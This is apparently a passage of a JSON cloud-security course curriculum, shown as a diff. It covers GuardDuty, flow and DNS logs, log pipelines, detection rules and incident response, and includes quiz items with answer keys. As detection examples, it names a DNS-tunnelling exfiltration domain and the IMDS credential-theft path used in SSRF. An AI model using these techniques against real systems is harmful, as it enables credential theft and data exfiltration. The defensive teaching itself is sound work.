+              "lines": [
+                {
+                  "command": "aws guardduty get-findings --detector-id d-abc --finding-ids f-123 --query 'Findings[0].{type:Type,sev:Severity,ip:Service.Action.AwsApiCallAction.RemoteIpDetails.IpAddressV4}'",
+                  "output": "{\n  \"type\": \"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS\",\n  \"sev\": 8.0,\n  \"ip\": \"198.51.100.22\"\n}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Triaging a Finding",
+            "body": "A finding is a lead, not a verdict. Work it like this:\n\n1. Read the type and severity — the type names the technique; filter noise by severity.\n2. Identify the resource and principal — which instance, role, or user?\n3. Pivot to CloudTrail — what did that principal do before and after the finding? GuardDuty tells you something is wrong; CloudTrail (via Athena) tells you the full scope.\n4. Decide: true positive, benign anomaly (e.g. a new CI/CD runner), or a known exception.\n5. Act or suppress — contain if real; write a suppression rule if it is a recurring false positive.\n\nSuppress deliberately, not reflexively — a suppression rule that is too broad is how real attacks get ignored.",
+            "check": {
+              "question": "GuardDuty raises UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS. What exactly has GuardDuty detected?",
+              "options": [
+                "An EC2 instance was launched in a new region",
+                "Temporary credentials belonging to an EC2 instance role are being used from an IP address outside AWS",
+                "An S3 bucket was made public",
+                "A root account login from a new device"
+              ],
+              "correctIndex": 1,
+              "explanation": "This finding fires when credentials GuardDuty knows are tied to a specific EC2 instance role appear in API calls originating outside AWS — the signature of the SSRF-to-IMDS credential-theft chain, where stolen role creds are replayed from the attacker's own machine."
+            }
+          },
+          {
+            "title": "The Detection Ecosystem",
+            "body": "GuardDuty is one piece. Three sibling services round out visibility:\n\n- Amazon Detective — takes GuardDuty findings and builds entity-behaviour graphs so you can investigate relationships over time (\"show me everything this role touched in the last 30 days\"). Investigation, not detection.\n- Amazon Macie — scans S3 for sensitive data (PII, credentials, secrets) and classifies which buckets hold what. Answers \"was the exfiltrated data actually sensitive?\"\n- AWS Security Hub — the aggregator. Collects findings from GuardDuty, Macie, Inspector, and third parties into one normalised view, and runs posture checks (CIS, AWS Foundational Security Best Practices).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "GuardDuty",
+                  "points": [
+                    "Detects threats",
+                    "Live findings",
+                    "From logs"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Detective",
+                  "points": [
+                    "Investigates",
+                    "Behaviour graphs",
+                    "Scopes a finding"
+                  ]
+                },
+                {
+                  "label": "Macie",
+                  "points": [
+                    "Finds sensitive data",
+                    "Classifies S3",
+                    "Data-centric"
+                  ]
+                },
+                {
+                  "label": "Security Hub",
+                  "points": [
+                    "Aggregates all",
+                    "Posture checks",
+                    "One pane of glass"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "What GuardDuty Cannot See",
+            "body": "Knowing the blind spots keeps you honest:\n\n- It is detection-only — it never blocks an attack; you must wire response via EventBridge.\n- No agent inside the OS — it won't see in-process malware, local privilege escalation, or file changes on the host (that is Inspector / endpoint tooling).\n- Application-layer logic abuse is invisible — valid API calls that are business-logic attacks look normal.\n- It depends on its feeds — if you disabled S3 data protection, S3-based findings won't appear.\n- It has latency — findings can take minutes; a fast smash-and-grab may complete before you are alerted.\n\nGuardDuty is excellent at credential misuse, recon, crypto-mining, and known-bad infrastructure — treat it as one strong layer, not the whole defence."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Writing and tuning your own detections (the next topics) is powerful but slow. GuardDuty gives you a broad, maintained baseline of threat detection on day one, including the hard-to-write correlations like InstanceCredentialExfiltration.OutsideAWS that would take real engineering to reproduce by hand.\n\nThe winning strategy is layered: GuardDuty for the maintained, correlation-heavy detections; your own CloudTrail/Athena and Sigma rules (coming up) for the TTPs specific to your environment and the exact attacks in this course. Security Hub ties them together, Detective lets you investigate, and Macie tells you whether what was taken actually mattered."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m10-3",
+        "moduleId": "cloud-m10",
+        "number": 61,
+        "title": "Network & Flow Visibility",
+        "type": "theory",
+        "week": 4,
+        "description": "Seeing traffic, not just API calls. VPC Flow Logs and DNS logs reveal exfiltration and C2 that CloudTrail misses.",
+        "keyPoints": [
+          "VPC Flow Logs: accepted/rejected connections, bytes, for exfil detection",
+          "Route53 Resolver query logging for DNS-based C2 and tunneling",
+          "Detecting data exfiltration by volume and destination anomalies",
+          "Metadata-service access patterns in logs",
+          "Centralising flow logs for cross-account analysis"
+        ],
+        "slides": [
+          {
+            "title": "Seeing Traffic, Not Just API Calls",
+            "body": "CloudTrail answers \"which AWS APIs were called?\" But a lot of an attack happens below the API layer: an EC2 instance opening a TCP connection to an attacker's server to stream out gigabytes of data, or a compromised container resolving a command-and-control (C2) domain.\n\nNone of that is an AWS API call, so CloudTrail is blind to it. Network and flow visibility fills that gap.\n\nAnalogy: CloudTrail is the building's door-access log — who badged through which door. Flow logs and DNS logs are the record of who phoned out of the building and how much they said. You need both to reconstruct an intrusion."
+          },
+          {
+            "title": "VPC Flow Logs",
+            "body": "A VPC Flow Log records metadata about network connections in your virtual private cloud — not the packet contents, but the envelope: source and destination IP, ports, protocol, byte and packet counts, and whether the connection was ACCEPTed or REJECTed by security groups / NACLs.\n\nWhy it matters for defence:\n- REJECT records reveal scanning and probing.\n- Large byte counts to an unfamiliar external IP reveal data exfiltration.\n- Connections to known-bad IPs reveal C2.\n\nIt is metadata, so it is comparatively cheap and privacy-preserving, but you cannot see what was sent — only how much, where, and whether it was allowed.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "# one VPC Flow Log record (default format)",
+                  "output": "2 111122223333 eni-0abc 10.0.3.14 198.51.100.22 51322 443 6 84210 128900000 1700000000 1700000060 ACCEPT OK"
+                },
+                {
+                  "command": "# fields: ver acct eni srcaddr dstaddr srcport dstport proto packets BYTES start end action status",
+                  "output": "128900000 bytes (~123 MB) out to 198.51.100.22:443 — possible exfiltration"
+                }
+              ]
+            }
+          },
+          {
+            "title": "DNS Query Logging",
+            "body": "Before a compromised host talks to a C2 server, it usually has to resolve a domain name. Route 53 Resolver query logging records every DNS lookup made from inside your VPC: the domain queried, the instance that asked, and the response.\n\nThis catches techniques that flow logs alone miss:\n- C2 via domain names — the IP may rotate, but the domain pattern recurs.\n- DNS tunnelling — exfiltration hidden inside DNS queries themselves (long, random-looking subdomains like a7f3...xk.exfil.attacker.com), where the data is smuggled in the query name. Flow logs just see normal DNS traffic; the DNS query log shows the suspicious domains.\n\nGuardDuty consumes these resolver logs automatically for its DNS-based findings.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Host resolves domain",
+                  "detail": "a7f3xk.exfil.attacker.com"
+                },
+                {
+                  "label": "Route 53 Resolver",
+                  "detail": "answers + logs the query"
+                },
+                {
+                  "label": "Query log record",
+                  "detail": "domain, instance, response"
+                },
+                {
+                  "label": "Detection",
+                  "detail": "long random subdomains = DNS tunnelling"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detecting Exfiltration by Volume & Destination",
+            "body": "Exfiltration shows up as two kinds of anomaly in flow logs:\n\n1. Volume anomaly — a host that normally sends a few MB/day suddenly pushes hundreds of MB or GB outbound. Baseline per-ENI egress and alert on deviations.\n2. Destination anomaly — traffic to an IP or ASN the environment has never contacted, especially a residential ISP, a cheap VPS provider, or a country with no business reason.\n\nThe strongest signal combines both: high volume to a brand-new external destination. A good detection sums bytes per source/destination pair over a time window and flags pairs where outbound bytes cross a threshold to a non-allowlisted destination.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Normal egress",
+                  "points": [
+                    "Few MB/day",
+                    "Known SaaS/AWS IPs",
+                    "Business-hours pattern"
+                  ]
+                },
+                {
+                  "label": "Exfiltration",
+                  "points": [
+                    "Hundreds of MB-GB",
+                    "New external IP / cheap VPS",
+                    "Off-hours burst"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Metadata-Service Access Patterns",
+            "body": "The instance metadata service (IMDS) lives at the link-local address 169.254.169.254. Legitimate workloads query it constantly — but the pattern of that access is a detection goldmine.\n\n- IMDSv1 vs IMDSv2 — IMDSv2 requires a session token (a PUT to fetch a token, then GETs carrying it). SSRF attacks that only send a GET fail against a token-required endpoint, which is why enforcing IMDSv2 is a top hardening step.\n- In access logs or host logs, a request to 169.254.169.254/latest/meta-data/iam/security-credentials/ originating from a web-request path is the fingerprint of SSRF stealing role credentials.\n\nFlow logs show the link-local traffic; host and app logs show the suspicious request shape. Correlating them pins down SSRF."
+          },
+          {
+            "title": "Centralising Flow Logs",
+            "body": "Like CloudTrail, flow and DNS logs are far more useful centralised. In a multi-account org you:\n\n1. Send each account's VPC Flow Logs and Resolver query logs to a central destination — commonly an S3 bucket in a log-archive account, or a central CloudWatch Logs group.\n2. Query across all of them with Athena, so you can trace an attacker's traffic as it moves between accounts and VPCs.\n3. Apply one consistent set of detections instead of per-account snowflakes.\n\nCentralisation also means a compromised workload account cannot quietly delete its own network evidence — the same tamper-resistance argument as CloudTrail.",
+            "check": {
+              "question": "An attacker uses DNS tunnelling to exfiltrate data through queries like a7f3k9x2.exfil.attacker.com. Which log source most directly reveals this, and why?",
+              "options": [
+                "VPC Flow Logs, because they show the byte counts of each DNS packet",
+                "CloudTrail, because DNS resolution is an API call",
+                "Route 53 Resolver query logs, because they record the actual domain names queried, exposing the long random subdomains",
+                "Security group rules, because they block DNS by default"
+              ],
+              "correctIndex": 2,
+              "explanation": "DNS tunnelling hides data inside the query names. Flow logs only see 'some DNS traffic on port 53', but Resolver query logging records the full domain strings, where the long, high-entropy subdomains betray the tunnel. CloudTrail does not log DNS resolution at all."
+            }
+          },
+          {
+            "title": "Defend & Harden",
+            "body": "Turn visibility into prevention:\n\n- Enforce IMDSv2 (HttpTokens=required) on every instance and launch template — kills the most common SSRF credential-theft path.\n- Egress filtering — use security groups, NACLs, and an egress firewall (AWS Network Firewall) to deny outbound to anything not explicitly needed; exfiltration needs an open path out.\n- Baseline + alert — compute normal per-host egress and alert on volume and new-destination anomalies.\n- Enable and centralise both flow logs and Resolver query logs — you cannot detect what you do not record.\n- Feed GuardDuty — keep its DNS and flow data sources on so the maintained detections run alongside yours."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "The attacks earlier in this course don't end at the API. SSRF steals credentials over a link-local HTTP request; data theft leaves as a bulk outbound transfer; C2 beacons out over DNS and TCP. If you only watch CloudTrail, you watch the attacker pick the lock and miss them carrying the furniture out the back door.\n\nNetwork and flow visibility is the layer that catches exfiltration and C2 — the damage phase. Combined with CloudTrail's record of the API actions, it lets you reconstruct a full intrusion: what they accessed (API), and what left the building (flow/DNS)."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m10-4",
+        "moduleId": "cloud-m10",
+        "number": 62,
+        "title": "Building a Log Pipeline",
+        "type": "lab",
+        "week": 4,
+        "description": "Operationalising logs. Students route CloudTrail and findings into a queryable, alertable pipeline.",
+        "keyPoints": [
+          "CloudTrail -> S3 -> Athena for SQL queries over API history",
+          "EventBridge rules on specific API events to trigger alerts/automation",
+          "CloudWatch Logs metric filters and alarms",
+          "Shipping to a SIEM (OpenSearch, Splunk) and the cost/retention tradeoff",
+          "SOAR-style auto-response (e.g. auto-quarantine a flagged instance)"
+        ],
+        "slides": [
+          {
+            "title": "From Raw Logs to a Pipeline",
+            "body": "Having CloudTrail, flow logs, and GuardDuty findings is necessary but not enough. Raw logs sitting in an S3 bucket are like boxes of receipts in a basement: the evidence exists, but nobody can answer a question quickly.\n\nA log pipeline turns that pile into something queryable (you can ask it questions), alertable (it tells you when something matters), and automatable (it can respond on its own). This is the lab topic — you build the plumbing that makes detection practical.\n\nThe three jobs of a pipeline: store and search history, fire alerts in near-real-time, and trigger automated response. AWS gives you a native tool for each."
+          },
+          {
+            "title": "CloudTrail to S3 to Athena",
+            "body": "The foundation is cheap, scalable history you can query with SQL.\n\n- CloudTrail delivers events to an S3 bucket (ideally the centralised, locked one).\n- Amazon Athena reads directly from that S3 data using standard SQL — no database to run, you pay per query (per data scanned).\n- You create a table whose schema maps to the CloudTrail JSON, then query API history across months.\n\nThis is how you answer investigation questions: \"show every CreateAccessKey in the last 30 days,\" \"what did this principal do between 02:00 and 04:00?\" Partitioning the table by date keeps scans — and cost — small.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "CloudTrail",
+                  "detail": "captures API events"
+                },
+                {
+                  "label": "S3 bucket",
+                  "detail": "durable JSON log store"
+                },
+                {
+                  "label": "Athena table",
+                  "detail": "SQL schema over the JSON"
+                },
+                {
+                  "label": "SQL query",
+                  "detail": "ad-hoc investigation"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Athena Query",
+            "body": "Suppose you want every access-key creation, newest first, to hunt for an attacker establishing persistence. Against a partitioned CloudTrail Athena table the query is plain SQL.\n\nThe key columns are the same fields you learned to read on raw events — eventname, useridentity, sourceipaddress — now queryable at scale. This is the engine behind both the 'Detect Your Own Attack' lab and incident scoping.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "athena>",
+              "lines": [
+                {
+                  "command": "SELECT eventtime, useridentity.arn, sourceipaddress\nFROM cloudtrail_logs\nWHERE eventname = 'CreateAccessKey'\n  AND date >= '2026/11/01'\nORDER BY eventtime DESC;",
+                  "output": "2026-11-15T02:14:07Z  arn:aws:iam::1111:user/backup-svc  203.0.113.47\n2026-11-15T02:14:51Z  arn:aws:iam::1111:user/backup-svc  203.0.113.47\n(2 rows)  — backup-svc minting keys from an unknown IP at 02:14"
+                }
+              ]
+            }
+          },
+          {
+            "title": "EventBridge for Real-Time Alerts",
+            "body": "Athena is for after-the-fact hunting. For near-real-time response you use Amazon EventBridge, which matches events as they arrive and fires an action.\n\nYou write a rule with an event pattern — e.g. 'any StopLogging or DeleteTrail call' or 'any AttachUserPolicy on an admin policy' — and a target: an SNS topic to page a human, or a Lambda to respond automatically.\n\nBecause CloudTrail feeds EventBridge within minutes, this is how you catch an attacker blinding the logs or escalating privileges while it is happening, not the next morning.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "CloudTrail event",
+              "rightLabel": "EventBridge rule",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "event arrives",
+                  "payload": "{ \"eventName\": \"StopLogging\", \"source\": \"aws.cloudtrail\" }"
+                },
+                {
+                  "direction": "left",
+                  "label": "pattern matches -> target fires",
+                  "payload": "SNS alert to on-call + Lambda disables the actor's keys"
+                }
+              ]
+            }
+          },
+          {
+            "title": "CloudWatch Metric Filters & Alarms",
+            "body": "A third native path works on CloudTrail delivered to CloudWatch Logs.\n\n- A metric filter scans the log stream for a text/pattern (e.g. '{ $.errorCode = \"AccessDenied\" }') and increments a CloudWatch metric each time it matches.\n- A CloudWatch alarm watches that metric and fires when it crosses a threshold over a period — e.g. 'more than 20 AccessDenied from one principal in 5 minutes'.\n\nThis is ideal for rate-based detections (enumeration bursts, repeated failures) where you care about how often, not just whether. It is the classic pattern behind the CIS AWS Benchmark's recommended alarms (root login, unauthorized API calls, policy changes).",
+            "check": {
+              "question": "You need to alert when ANY principal generates more than 20 AccessDenied errors in 5 minutes (an enumeration burst). Which AWS mechanism fits best?",
+              "options": [
+                "An Athena query run once a day",
+                "A CloudWatch Logs metric filter on errorCode=AccessDenied feeding an alarm with a count threshold over 5 minutes",
+                "A GuardDuty suppression rule",
+                "An S3 bucket policy"
+              ],
+              "correctIndex": 1,
+              "explanation": "Rate-based detection ('more than N of X within a time window') is exactly what a CloudWatch metric filter plus alarm does: the filter counts matching events into a metric, and the alarm fires on the threshold over the period. Athena is for ad-hoc historical queries, not continuous rate alarms."
+            }
+          },
+          {
+            "title": "Shipping to a SIEM: Cost vs Retention",
+            "body": "Native tools are great, but many teams also ship logs to a SIEM (Security Information and Event Management platform) — Amazon OpenSearch, Splunk, or similar — for correlation across sources, long retention, and investigation UIs.\n\nThe core tradeoff is cost vs retention vs queryability:\n- Hot in a SIEM — fast search, rich dashboards, expensive; keep recent data (e.g. 90 days).\n- Cold in S3 + Athena — cheap, slower, near-infinite retention; keep the long tail and query on demand.\n\nA common tiered design: stream everything to S3 forever (cheap source of truth), index a recent window in the SIEM for day-to-day work, and fall back to Athena for old investigations.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "SIEM (hot)",
+                  "points": [
+                    "Fast search + dashboards",
+                    "Cross-source correlation",
+                    "Expensive",
+                    "Keep ~90 days"
+                  ]
+                },
+                {
+                  "label": "S3 + Athena (cold)",
+                  "points": [
+                    "Cheap, near-infinite retention",
+                    "Pay per query",
+                    "Slower",
+                    "Keep the long tail"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "SOAR-Style Auto-Response",
+            "body": "The top of the pipeline is automation — SOAR (Security Orchestration, Automation and Response). Instead of only paging a human, a rule triggers code that contains the threat in seconds.\n\nPattern: GuardDuty finding or EventBridge rule -> Lambda (or Step Functions) -> automated action, for example:\n- Auto-quarantine a flagged EC2 instance by swapping it to an isolation security group that allows no traffic.\n- Auto-disable an access key implicated in a finding.\n- Auto-revoke active role sessions.\n\nBuild guardrails: scope automation narrowly, log every action, and prefer reversible containment (isolate) over destructive action (terminate) so an automated false positive doesn't cause its own outage.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "GuardDuty finding",
+                  "detail": "InstanceCredentialExfiltration"
+                },
+                {
+                  "label": "EventBridge rule",
+                  "detail": "matches finding type + severity"
+                },
+                {
+                  "label": "Lambda responder",
+                  "detail": "scoped, logged"
+                },
+                {
+                  "label": "Isolate instance",
+                  "detail": "swap to no-traffic SG"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Build the Pipeline",
+            "body": "The 'Detect Your Own Attack' lab (AWS free tier: CloudTrail + Athena + GuardDuty) is where this becomes real. Minimum build:\n\n1. Confirm CloudTrail is delivering to an S3 bucket; enable S3 data events on your target bucket.\n2. Create the Athena table over the CloudTrail logs and run the CreateAccessKey query above.\n3. Create one EventBridge rule on StopLogging/DeleteTrail -> SNS to your email.\n4. Create one CloudWatch metric filter + alarm on AccessDenied bursts.\n5. Re-run an earlier privilege-escalation attack and confirm each layer catches it.\n\nSuccess criterion: you run the attack and the pipeline, not you, tells you it happened."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Detection content (the rules you write next) is worthless without a pipeline to run it on. The pipeline decides whether a detection is a daily hunt (Athena), a near-real-time page (EventBridge, CloudWatch), or an automatic containment (SOAR Lambda).\n\nIt also forces the economic reality of security operations: you cannot index everything hot forever, so you tier storage and retention deliberately. Teams that skip this end up with either crippling SIEM bills or logs they technically have but can never query in time. A well-built pipeline is what turns 'we had the logs' into 'we caught it.'"
+          }
+        ]
+      },
+      {
+        "id": "cloud-m10-5",
+        "moduleId": "cloud-m10",
+        "number": 63,
+        "title": "Writing Detections for Known TTPs",
+        "type": "exercise",
+        "week": 4,
+        "description": "The payoff of learning the attacks: students author detections for each technique they exploited earlier and test them by re-running the attack.",
+        "keyPoints": [
+          "Detect IAM escalation: CreateAccessKey/AttachUserPolicy/UpdateAssumeRolePolicy on sensitive principals",
+          "Detect credential exfil: role creds used from an IP outside AWS",
+          "Detect mass GetSecretValue / S3 GetObject as data exfiltration",
+          "Detect enumeration bursts (many AccessDenied from one principal)",
+          "Sigma-style rules and mapping detections to MITRE ATT&CK cloud techniques"
+        ],
+        "slides": [
+          {
+            "title": "The Payoff: Detect What You Exploited",
+            "body": "This is where offence becomes defence. For every attack technique you ran earlier in the course, you now write a detection that catches it — and you prove it works by re-running the attack and watching the detection fire.\n\nA detection is just a precise description of what an attack looks like in the logs, plus a trigger. The discipline: start from the exact CloudTrail eventNames, principals, and conditions the attack produces, then write the narrowest rule that catches it without drowning in false positives.\n\nAnalogy: you learned to pick the lock; now you install the specific alarm that trips on that exact lock-picking motion. Knowing the attack intimately is what lets you write a tight detection instead of a noisy one."
+          },
+          {
+            "title": "Detect IAM Privilege Escalation",
+            "body": "Privilege escalation in IAM has signature API calls. Watch for these, especially when the target is a sensitive principal (an admin user/role) or the actor is not a known admin:\n\n- CreateAccessKey — minting long-lived keys, often on another user (persistence)\n- AttachUserPolicy / AttachRolePolicy / PutUserPolicy — granting more permissions, especially AdministratorAccess\n- UpdateAssumeRolePolicy — rewriting who can assume a role (a classic backdoor)\n- CreateUser / AddUserToGroup — building new access\n\nThe tightest version alerts when these calls target privileged principals or come from an actor outside the normal admin set, cutting false positives from legitimate admin work.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "athena>",
+              "lines": [
+                {
+                  "command": "SELECT eventtime, useridentity.arn AS actor, eventname,\n       json_extract_scalar(requestparameters,'$.policyArn') AS policy\nFROM cloudtrail_logs\nWHERE eventname IN ('AttachUserPolicy','AttachRolePolicy','UpdateAssumeRolePolicy')\n  AND json_extract_scalar(requestparameters,'$.policyArn') LIKE '%AdministratorAccess%';",
+                  "output": "2026-11-15T02:15Z  user/backup-svc  AttachUserPolicy  arn:aws:iam::aws:policy/AdministratorAccess\n(1 row)  — backup-svc just granted itself admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detect Credential Exfiltration",
+            "body": "The SSRF-to-IMDS chain ends with instance-role credentials being used from somewhere they should never appear: outside AWS.\n\nThe detection logic: role credentials tied to an EC2 instance should only ever call APIs from inside AWS. If you see CloudTrail events using those credentials with a sourceIPAddress that is a non-AWS IP, that is exfiltrated-credential replay.\n\nGuardDuty gives you this for free (InstanceCredentialExfiltration.OutsideAWS), but writing your own version teaches the mechanism and covers cases GuardDuty's baseline may not — e.g. correlating the specific instance ID in the credential's session context against an allowlist of expected egress IPs.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "SSRF reads IMDS",
+                  "detail": "steals instance role creds"
+                },
+                {
+                  "label": "Creds replayed",
+                  "detail": "from attacker IP outside AWS"
+                },
+                {
+                  "label": "CloudTrail event",
+                  "detail": "assumed-role session + non-AWS sourceIP"
+                },
+                {
+                  "label": "Detection fires",
+                  "detail": "instance creds used off-AWS"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detect Mass Data Exfiltration",
+            "body": "Bulk reads of secrets or objects are the data-theft fingerprint. Two high-value detections:\n\n1. Mass GetSecretValue — a principal calling Secrets Manager GetSecretValue many times in a short window is dumping every secret it can reach. Alert on count-per-principal over a window.\n2. Mass S3 GetObject — requires S3 data events enabled. A sudden spike of GetObject by one principal, especially across many keys or whole prefixes, signals bulk exfiltration.\n\nThe pattern is rate-based: it is not any single call that is bad, it is the volume. This is where CloudWatch metric filters/alarms or an Athena GROUP BY ... HAVING count() > threshold shine.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "athena>",
+              "lines": [
+                {
+                  "command": "SELECT useridentity.arn AS actor, COUNT(*) AS secrets_read\nFROM cloudtrail_logs\nWHERE eventname = 'GetSecretValue'\n  AND eventtime > '2026-11-15T02:00:00Z'\nGROUP BY useridentity.arn\nHAVING COUNT(*) > 25;",
+                  "output": "arn:aws:iam::1111:user/backup-svc   87\n(1 row)  — 87 secrets pulled in minutes = exfiltration"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detect Enumeration Bursts",
+            "body": "Before exploiting anything, attackers map what they can reach — and permission denials are the exhaust of that recon. A principal generating a burst of AccessDenied / UnauthorizedOperation errors across many different APIs is enumerating its own access.\n\nDetection: count errorCode = 'AccessDenied' (and 'Client.UnauthorizedOperation') per principal over a short window; alert past a threshold.\n\nThis is one of the most reliable early-warning signals because legitimate automation rarely trips dozens of denials. It catches the attacker during recon — before the escalation and exfiltration you detect with the other rules — giving you the earliest possible warning.",
+            "check": {
+              "question": "You want to catch an attacker in the recon phase, before they escalate or exfiltrate. Which log signal is the most reliable early warning?",
+              "options": [
+                "A single successful GetCallerIdentity call",
+                "A burst of AccessDenied / UnauthorizedOperation errors from one principal across many different APIs in a short window",
+                "An EC2 instance launching in a new region",
+                "A successful S3 PutObject"
+              ],
+              "correctIndex": 1,
+              "explanation": "Enumeration generates many permission-denied errors as the attacker probes what it can reach. A spike of AccessDenied from a single principal across varied APIs is a strong, early, low-false-positive signal — legitimate automation rarely trips dozens of denials."
+            }
+          },
+          {
+            "title": "Sigma Rules & Mapping to MITRE ATT&CK",
+            "body": "Write detections in a portable, documented format so they survive tool changes and are easy to review.\n\n- Sigma is a vendor-neutral YAML format for detection rules. You write the logic once and convert it to Athena SQL, OpenSearch queries, Splunk SPL, etc. It makes detections shareable and version-controllable.\n- MITRE ATT&CK for Cloud (and MITRE ATLAS for AI systems) gives every technique an ID. Tagging each rule with its technique (e.g. T1078 Valid Accounts, T1537 Transfer Data to Cloud Account, T1098 Account Manipulation) lets you measure coverage — which techniques you can detect and which you are blind to.\n\nTogether: portable rules, mapped to a shared taxonomy, with measurable coverage.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Detection",
+                  "points": [
+                    "IAM escalation",
+                    "Cred exfil off-AWS",
+                    "Mass GetSecretValue",
+                    "AccessDenied burst"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "ATT&CK technique",
+                  "points": [
+                    "T1098 Account Manipulation",
+                    "T1552/T1078 Valid Accounts",
+                    "T1552 Unsecured Credentials",
+                    "T1580 Cloud Discovery"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Test by Re-Running the Attack",
+            "body": "A detection you have not tested is a hope, not a control. The exercise discipline is red-team/blue-team in one loop:\n\n1. Deploy the detection (Athena query on a schedule, EventBridge rule, or metric alarm).\n2. Re-run the exact attack from the earlier module — escalate privileges, replay stolen creds, bulk-read secrets.\n3. Confirm the detection fires, with the right data, within the expected time.\n4. Tune — if it missed (false negative) tighten the logic; if it is too noisy (false positives) narrow the conditions.\n\nThis closes the loop the whole course is built on: you attacked it, so you know precisely what to look for, so your detection is sharp. Record coverage against ATT&CK so gaps are explicit."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Generic, bought detections catch generic attacks. The detections that catch a breach in your environment are the ones written by someone who understands exactly how the attack unfolds in these logs — which is now you.\n\nMapping to MITRE ATT&CK turns a pile of rules into a measurable security posture: you can state, to a boss or an auditor, which techniques you detect and which you don't. Writing in Sigma keeps that work portable as tools change. And testing by re-running the attack is the only honest proof that a detection works. This topic is where the course's offence pays its dividend as durable, measured defence."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m10-6",
+        "moduleId": "cloud-m10",
+        "number": 64,
+        "title": "Cloud Incident Response",
+        "type": "theory",
+        "week": 4,
+        "description": "What to do when it happens. A cloud-specific IR workflow: contain, evict, investigate and recover without destroying evidence.",
+        "keyPoints": [
+          "Containment: revoke sessions (role revoke-session policy), disable keys, isolate instance SG",
+          "Evidence preservation: snapshot volumes, memory capture, preserve CloudTrail",
+          "Scoping with Athena/Detective: what did the credential touch and when",
+          "Eradication: rotate all potentially-exposed secrets, remove persistence",
+          "AWS IR playbooks and the 'assume credentials are fully compromised' rule"
+        ],
+        "slides": [
+          {
+            "title": "What Cloud Incident Response Is",
+            "body": "Incident response (IR) is the disciplined process you follow when a detection fires and a compromise is real. Cloud IR has its own shape because the assets are API-defined and ephemeral — you contain with policies and API calls, not by unplugging a cable.\n\nAnalogy: a house fire. You don't start by investigating the cause while it spreads — you contain it (stop it spreading), evict the threat (put it out), investigate (find the cause), and recover (rebuild safely). Panic and improvisation make it worse; a rehearsed playbook makes it survivable.\n\nThe golden rule of cloud IR: once a credential is suspected compromised, assume it is fully compromised. Half-measures leave the attacker a way back in."
+          },
+          {
+            "title": "The IR Lifecycle",
+            "body": "A cloud incident moves through four phases, in order — but containment comes before investigation, because stopping the bleeding beats understanding it perfectly.\n\n1. Contain — cut off the attacker's access right now.\n2. Preserve & investigate — capture evidence, then scope what was touched.\n3. Eradicate — remove the attacker's footholds and rotate everything exposed.\n4. Recover — restore clean operation and add detections so it can't recur the same way.\n\nThe tension throughout: contain fast, but don't destroy evidence doing it. Isolate rather than delete wherever possible.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Contain",
+                  "detail": "revoke sessions, disable keys, isolate instance"
+                },
+                {
+                  "label": "Preserve",
+                  "detail": "snapshot, memory, keep CloudTrail"
+                },
+                {
+                  "label": "Investigate",
+                  "detail": "scope with Athena / Detective"
+                },
+                {
+                  "label": "Eradicate",
+                  "detail": "rotate secrets, remove persistence"
+                },
+                {
+                  "label": "Recover",
+                  "detail": "restore + new detections"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Containment",
+            "body": "Cut the attacker off without tipping over the whole environment. The core cloud containment moves:\n\n- Revoke active sessions — for a role, attach an inline 'revoke older than now' policy (AWSRevokeOlderSessions pattern) using a DenyAllBefore timestamp so existing temporary credentials stop working immediately. Disabling the role alone does not kill sessions already issued.\n- Disable access keys — set the compromised IAM user's access key to Inactive (don't delete it yet — you want it for forensics).\n- Isolate the instance — move a compromised EC2 to a quarantine security group that permits no traffic, cutting C2 and exfiltration while preserving the host.\n\nPrefer reversible isolation over destruction so you keep both control and evidence.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "# 1) kill existing role sessions",
+                  "output": "aws iam put-role-policy --role-name webapp-role --policy-name Revoke \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Action\":\"*\",\"Resource\":\"*\",\"Condition\":{\"DateLessThan\":{\"aws:TokenIssueTime\":\"2026-11-15T02:20:00Z\"}}}]}'"
+                },
+                {
+                  "command": "# 2) disable the leaked key (keep for forensics)",
